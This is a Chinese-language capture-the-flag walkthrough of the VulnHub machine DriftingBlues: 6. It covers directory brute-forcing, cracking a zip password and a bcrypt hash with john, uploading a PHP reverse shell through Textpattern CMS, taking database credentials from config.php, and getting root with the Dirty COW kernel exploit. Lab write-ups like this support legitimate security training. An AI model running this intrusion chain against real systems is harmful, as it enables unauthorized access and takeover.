# DriftingBlues: 6

2024-5-24 https://www.vulnhub.com/entry/driftingblues-6,672/

difficulty: easy

## IP

192.168.5.30

## Scan

Open Port -> 80

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: driftingblues
| http-robots.txt: 1 disallowed entry
|_/textpattern/textpattern
|_http-server-header: Apache/2.2.22 (Debian)
```

只有一个 80，访问后，源代码有提示：

```
please hack vvmlist.github.io instead
he and their army always hacking us -->
```

使用 gobuster 进行目录扫描，看看有什么目录信息：

```
http://192.168.5.30/robots
http://192.168.5.30/spammer
http://192.168.5.30/db
```

/robots 显示：

```
User-agent: *
Disallow: /textpattern/textpattern

dont forget to add .zip extension to your dir-brute
;)
```

添加 zip 后缀，再次使用 gobuster 扫描：

```
gobuster -t 64 dir -u http://192.168.5.30/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html,zip -e
```

发现 http://192.168.5.30/spammer.zip ，下载查看，是一个加密的 zip，使用 john + rockyou 看看能不能找到解密密码：

```
zip2john spammer.zip > hash
john hash --wordlist=~/tools/dict/rockyou.txt
```

爆破出解压密码:myspace4

解压后，看看什么信息：mayer:lionheart ，是一个用户名和密码，现在需要找到登陆的地方。没有 ssh，只有 web 服务，robots 中还提示了一个目录 /textpattern/textpattern 这里应该就是登陆页面。

http://192.168.5.30/textpattern/textpattern/ 输入 mayer:lionheart，进入后，是一个 Textpattern CMS (v4.8.3) 管理系统，看看有没有地方能写入 web shell 的。

在 content -> files 中可以上传文件，http://192.168.5.30/textpattern/textpattern/index.php?event=file

然后访问 http://192.168.5.30/textpattern/files/8888.php 就能触发反弹，现在 kali 上监听 8888 端口：

```
curl http://192.168.5.30/textpattern/files/8888.php
```

得到反弹的 shell:

```
www-data@driftingblues:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

/home 中没有特殊用户，看样子需要直接从 www-data 提权到 root。

发现数据库配置文件：

```
www-data@driftingblues:/var/www/textpattern/textpattern$ cat config.php

$txpcfg['db'] = 'textpattern_db';
$txpcfg['user'] = 'drifter';
$txpcfg['pass'] = 'imjustdrifting31';
$txpcfg['host'] = 'localhost';
$txpcfg['table_prefix'] = '';
$txpcfg['txpath'] = '/var/www/textpattern/textpattern';
$txpcfg['dbcharset'] = 'utf8mb4';
// For more customization options, please consult config-dist.php file.
```

登陆到数据库后，得到了一个 user 用户信息：

```
mysql> select * from txp_users;
mayer | $2y$10$vLuVi6USHmoVNQHioadI5OGONW1qXjqKxi4fVYAceKsAo5gzUPmeq
```

看看能不能得到明文密码，john + rockyou 得到：lionheart (mayer)

这几个密码都不是 root 的密码，最后只能尝试有没有内核提权了：

```
uname -a

Linux driftingblues 3.2.0
```

最终使用 dirtycow https://www.exploit-db.com/download/40847 进行提权。

```
firefart@driftingblues:~# cat flag.txt

░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!
```
